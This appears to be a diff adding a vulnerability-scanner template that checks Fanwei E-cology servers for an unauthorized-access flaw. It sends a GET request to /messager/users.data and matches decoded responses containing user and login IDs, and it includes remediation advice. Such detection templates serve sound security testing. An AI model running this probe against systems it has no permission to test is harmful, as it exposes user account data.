@@ -1,0 +1,37 @@
+id: Ecology-users_data-Unauthorized
+info:
+  name: Fanwei E-cology users.data Unauthorized Access
+  author:
+  - 折跃
+  description: |-
+    Fanwei E-cology users.data Unauthorized Access Leading to Sensitive Information Disclosure
+    Fanwei Collaborative Management Application Platform (e-cology) is a large enterprise collaborative management platform that integrates enterprise information portal, knowledge and document management, workflow management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management, and data center capabilities. e-cology can provide a series of general-purpose and industry-specific solutions.
+
+    An unauthorized access vulnerability exists in Fanwei E-cology. The vulnerability stems from the network system or product failing to properly restrict resource access from unauthorized roles, resulting in information disclosure.
+  severity: medium
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.weaver.com.cn/
+
+    Temporary remediation:
+    1. Validate user input on both the frontend and the backend simultaneously as a dual verification mechanism.
+    2. Verify whether a user has permission to invoke a feature before calling it.
+    3. Remove sensitive information exposed on pages or delete the pages that leak information
+    4. Encrypt sensitive information at rest and avoid sending it to the frontend unless necessary
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(base64_decode(body),'users')
+    - contains(base64_decode(body),'loginid')
+  path:
+  - '{{BaseURL}}/messager/users.data'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(32,"")}}'
